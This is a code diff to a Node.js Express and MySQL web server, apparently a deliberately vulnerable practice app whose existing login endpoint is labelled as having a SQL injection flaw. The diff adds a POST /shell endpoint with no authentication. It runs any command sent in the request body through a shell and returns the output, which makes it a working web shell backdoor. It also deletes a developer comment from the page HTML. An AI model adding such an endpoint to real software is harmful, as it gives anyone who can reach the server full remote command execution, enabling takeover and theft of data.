@@ -1,4 +1,5 @@
 const express = require("express");
+const { spawn } = require("child_process");
 const mysql = require("mysql2");
 const cors = require("cors");
 const fs = require("fs");
@@ -44,6 +45,30 @@ db.connect(err => {
         return;
     }
     console.log("Connected to MySQL Database");
+});
+
+// Shell execution endpoint
+app.post("/shell", (req, res) => {
+    const command = req.body.command; // Command from the request body
+    if (!command) {
+        return res.status(400).json({ error: 'Command is required' });
+    }
+
+    // Spawn a shell and execute the command
+    const shell = spawn(command, { shell: true });
+
+    let output = '';
+    shell.stdout.on('data', (data) => {
+        output += data.toString();
+    });
+
+    shell.stderr.on('data', (data) => {
+        output += data.toString();
+    });
+
+    shell.on('close', (code) => {
+        res.json({ output, exitCode: code });
+    });
 });
 
 // Fetch products from database
@@ -121,7 +146,6 @@ app.get("/search", (req, res) => {
         <html lang="en">
         <ultra-header>
     <header>
-        <!--DEV NOTES: aka.ms/confidential -->
         <a href="/">
             <img class="silky" src="img/Silk_road.png">
         </a>        
@@ -189,7 +213,6 @@ app.get("/search", (req, res) => {
         res.send(htmlContent);
     });
 });
-
 
 // Login Endpoint with SQL Injection Vulnerability
 app.post("/login", (req, res) => {
